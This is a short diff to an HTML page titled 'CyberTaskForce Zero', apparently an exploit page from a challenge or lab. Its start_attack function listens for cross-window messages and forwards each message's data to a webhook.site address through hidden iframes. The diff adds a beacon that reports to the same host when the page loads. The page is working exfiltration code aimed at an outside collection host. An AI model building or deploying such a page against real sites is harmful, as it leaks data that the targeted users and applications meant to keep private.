@@ -3,6 +3,9 @@
         <title>CyberTaskForce Zero</title>
         <script>
             function start_attack() {
+                let start_frame = document.createElement("iframe");
+                start_frame.src = "https://webhook.site/746de57f-9e50-4385-ad0b-452c40a0085b/loaded";
+                document.body.appendChild(start_frame);
                 window.addEventListener("message", (event) => {
                     let iframe = document.createElement("iframe");
                     iframe.src = "https://webhook.site/746de57f-9e50-4385-ad0b-452c40a0085b/" + encodeURIComponent(event.data);
